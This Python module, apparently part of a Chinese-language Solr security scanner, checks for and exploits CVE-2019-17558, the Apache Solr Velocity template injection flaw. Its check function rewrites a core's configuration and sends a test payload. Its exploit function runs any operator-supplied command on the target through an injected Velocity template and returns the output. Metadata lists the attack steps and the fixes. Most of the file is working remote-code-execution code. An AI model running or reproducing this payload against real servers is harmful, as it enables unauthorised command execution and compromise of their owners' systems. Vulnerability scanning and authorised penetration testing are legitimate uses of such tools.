#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Apache Solr CVE-2019-17558 漏洞检测模块
Apache Solr Velocity模板注入RCE漏洞
"""

import logging
import json
import re
import time
import urllib.parse

# 日志配置
logger = logging.getLogger(__name__)

def check(scanner, core=None):
    """
    检测CVE-2019-17558 Velocity模板注入RCE漏洞
    
    Args:
        scanner: SolrScanner实例
        core: 指定核心名称，为None时检测所有核心
        
    Returns:
        (bool, str): (是否存在漏洞, 详细信息)
    """
    try:
        # 参数校验
        if not scanner or not hasattr(scanner, 'target_url'):
            return False, "无效的扫描器实例"
        
        logger.info(f"检测CVE-2019-17558漏洞，目标: {scanner.target_url}")
        
        # 获取核心列表
        cores_to_check = []
        if core:
            cores_to_check = [core]
            logger.info(f"使用指定核心: {core}")
        else:
            cores = scanner.get_cores()
            if cores:
                cores_to_check = cores
                logger.info(f"获取到 {len(cores)} 个Solr核心")
            else:
                logger.warning("未获取到Solr核心列表")
        
        if not cores_to_check:
            return False, "未发现可用的Solr核心，请手动指定核心名称"
        
        # 检测每个核心是否存在漏洞
        for core_name in cores_to_check:
            logger.info(f"检测核心 {core_name} 是否存在CVE-2019-17558漏洞")
            
            try:
                # 尝试开启params.resource.loader.enabled
                config_data = {
                    "update-queryresponsewriter": {
                        "startup": "lazy",
                        "name": "velocity",
                        "class": "solr.VelocityResponseWriter",
                        "template.base.dir": "",
                        "solr.resource.loader.enabled": "true",
                        "params.resource.loader.enabled": "true"
                    }
                }
                
                logger.info(f"尝试为核心 {core_name} 开启Velocity模板引擎")
                resp = scanner.request(
                    "POST", 
                    f"/solr/{core_name}/config", 
                    json=config_data
                )
                
                if not resp or resp.status_code != 200:
                    logger.warning(f"为核心 {core_name} 开启Velocity模板引擎失败，状态码: {resp.status_code if resp else 'None'}")
                    continue
                
                # 构造测试payload
                test_payload = "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('echo SolrScanTest')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"
                encoded_payload = urllib.parse.quote(test_payload)
                
                # 发送测试请求
                logger.info(f"向核心 {core_name} 发送测试payload")
                resp = scanner.request(
                    "GET", 
                    f"/solr/{core_name}/select?q=1&&wt=velocity&v.template=custom&v.template.custom={encoded_payload}"
                )
                
                if resp and "SolrScanTest" in resp.text:
                    logger.info(f"核心 {core_name} 存在CVE-2019-17558漏洞")
                    return True, f"核心 {core_name} 存在CVE-2019-17558 Velocity模板注入RCE漏洞"
                else:
                    logger.info(f"核心 {core_name} 不存在CVE-2019-17558漏洞")
            except Exception as e:
                logger.error(f"检测核心 {core_name} 异常: {str(e)}")
                
        return False, "未发现CVE-2019-17558漏洞"
    except Exception as e:
        logger.error(f"检测CVE-2019-17558异常: {str(e)}")
        return False, f"检测异常: {str(e)}"

def exploit(scanner, core=None, command=None):
    """
    利用CVE-2019-17558漏洞执行命令
    
    Args:
        scanner: SolrScanner实例
        core: 指定核心名称，为None时使用第一个可用核心
        command: 要执行的命令
        
    Returns:
        (bool, str): (是否成功, 结果信息)
    """
    try:
        # 参数校验
        if not scanner or not hasattr(scanner, 'target_url'):
            return False, "无效的扫描器实例"
        
        if not command:
            return False, "请提供要执行的命令，例如: id 或 whoami"
        
        logger.info(f"利用CVE-2019-17558漏洞执行命令: {command}")
        
        # 获取可用的核心
        cores = []
        if core:
            cores = [core]
            logger.info(f"使用指定核心: {core}")
        else:
            available_cores = scanner.get_cores()
            if available_cores:
                cores = available_cores
                logger.info(f"获取到 {len(cores)} 个Solr核心")
            else:
                logger.warning("未获取到Solr核心列表")
        
        if not cores:
            return False, "未发现可用的Solr核心，请手动指定核心名称"
        
        core_name = cores[0]
        logger.info(f"使用核心 {core_name} 尝试执行命令")
        
        # 开启params.resource.loader.enabled
        config_data = {
            "update-queryresponsewriter": {
                "startup": "lazy",
                "name": "velocity",
                "class": "solr.VelocityResponseWriter",
                "template.base.dir": "",
                "solr.resource.loader.enabled": "true",
                "params.resource.loader.enabled": "true"
            }
        }
        
        logger.info(f"尝试为核心 {core_name} 开启Velocity模板引擎")
        resp = scanner.request(
            "POST", 
            f"/solr/{core_name}/config", 
            json=config_data
        )
        
        if not resp or resp.status_code != 200:
            return False, f"为核心 {core_name} 开启Velocity模板引擎失败，状态码: {resp.status_code if resp else 'None'}"
        
        # 构造执行命令的payload
        command_escaped = command.replace("'", "\\'").replace('"', '\\"')
        exploit_payload = f"#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('{command_escaped}')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"
        encoded_payload = urllib.parse.quote(exploit_payload)
        
        # 发送利用请求
        logger.info(f"向核心 {core_name} 发送命令执行payload")
        resp = scanner.request(
            "GET", 
            f"/solr/{core_name}/select?q=1&&wt=velocity&v.template=custom&v.template.custom={encoded_payload}"
        )
        
        if not resp:
            return False, "请求失败，未收到响应"
        
        if resp.status_code != 200:
            return False, f"请求失败，HTTP状态码: {resp.status_code}"
        
        # 尝试提取命令输出
        output = resp.text.strip()
        
        # 清理输出，移除HTML和JSON部分
        try:
            # 如果是JSON格式，提取有用部分
            data = json.loads(output)
            if "response" in data:
                # 可能是正常的Solr响应，命令输出可能在其他部分
                # 尝试在整个响应文本中查找命令输出
                clean_output = re.sub(r'<[^>]+>', '', output)
                
                # 尝试提取命令输出
                # 例如，对于"id"命令，尝试查找uid=和gid=
                if "uid=" in clean_output or "gid=" in clean_output:
                    uid_match = re.search(r'(uid=\d+.*?)\n', clean_output)
                    if uid_match:
                        return True, uid_match.group(1)
                
                # 如果找不到特定模式，返回部分响应
                return True, f"命令已执行，但无法提取明确输出。响应片段: {clean_output[:500]}..."
            else:
                return True, json.dumps(data, indent=2)
        except json.JSONDecodeError:
            # 不是JSON格式，可能是直接的命令输出
            # 尝试清理HTML标签
            clean_output = re.sub(r'<[^>]+>', '', output)
            
            # 如果输出太长，只返回前500个字符
            if len(clean_output) > 500:
                return True, f"{clean_output[:500]}...(输出已截断，共{len(clean_output)}字符)"
            
            return True, clean_output
    except Exception as e:
        logger.error(f"利用CVE-2019-17558异常: {str(e)}")
        return False, f"利用异常: {str(e)}"

def get_required_params():
    """
    获取漏洞利用所需参数
    
    Returns:
        dict: 参数说明字典
    """
    return {
        "check": {
            "core": "Solr核心名称，如不提供将自动检测所有核心"
        },
        "exploit": {
            "core": "Solr核心名称，如不提供将使用第一个可用核心",
            "command": "要执行的命令，例如: id 或 whoami"
        }
    }

def get_poc_info():
    """
    获取POC信息
    
    Returns:
        dict: POC信息字典
    """
    return {
        "name": "Apache Solr Velocity模板注入RCE",
        "CVE": "CVE-2019-17558",
        "severity": "高危",
        "affected_versions": "5.0.0 - 8.3.1",
        "description": "Apache Solr存在Velocity模板注入漏洞，攻击者可通过构造特殊请求执行任意命令。",
        "details": """
Apache Solr 5.0.0到8.3.1版本中的ConfigAPI允许通过Velocity模板执行任意代码。
攻击者可以通过发送特制的HTTP请求，启用Velocity响应写入器并注入恶意模板，从而在服务器上执行任意命令。

漏洞利用步骤:
1. 通过ConfigAPI启用Velocity模板引擎的params.resource.loader.enabled参数
2. 通过select处理器发送包含恶意Velocity模板的请求
3. 服务器执行模板中包含的命令并返回结果

修复方法:
- 升级到Apache Solr 8.4.0或更高版本
- 禁用Velocity响应写入器
- 限制对Solr管理接口的访问
        """,
        "references": [
            "https://github.com/jas502n/solr_rce",
            "https://issues.apache.org/jira/browse/SOLR-13971",
            "https://nvd.nist.gov/vuln/detail/CVE-2019-17558"
        ]
    }
